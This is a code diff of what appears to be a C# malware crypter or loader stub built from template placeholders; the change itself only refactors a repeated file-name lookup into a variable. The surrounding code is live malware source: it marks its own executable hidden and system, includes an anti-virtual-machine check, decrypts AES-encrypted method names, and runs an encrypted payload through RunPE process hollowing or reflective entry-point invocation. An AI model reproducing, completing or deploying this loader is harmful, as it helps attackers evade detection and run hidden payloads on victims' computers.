@@ -31,7 +31,8 @@ namespace namespace_name
 
         static void Main(string[] args)
         {
-            File.SetAttributes(Process.GetCurrentProcess().MainModule.FileName, FileAttributes.Hidden | FileAttributes.System);
+            string currentfilename = Process.GetCurrentProcess().MainModule.FileName;
+            File.SetAttributes(currentfilename, FileAttributes.Hidden | FileAttributes.System);
 #if ANTI_VM
             ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
             ManagementObjectCollection instances = searcher.Get();
@@ -107,7 +108,7 @@ namespace namespace_name
             string runpefunction = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpefunction_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             runpe.GetType(runpeclass).GetMethod(runpefunction).Invoke(null, new object[]
             {
-                Path.ChangeExtension(Process.GetCurrentProcess().MainModule.FileName, null),
+                Path.ChangeExtension(currentfilename, null),
                 payload,
                 targs
             }); 
@@ -116,7 +117,7 @@ namespace namespace_name
             try { entry.Invoke(null, new object[] { targs }); }
             catch { entry.Invoke(null, null); }
 #endif
-            File.SetAttributes(Process.GetCurrentProcess().MainModule.FileName, FileAttributes.Normal);
+            File.SetAttributes(currentfilename, FileAttributes.Normal);
         }
 
         static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
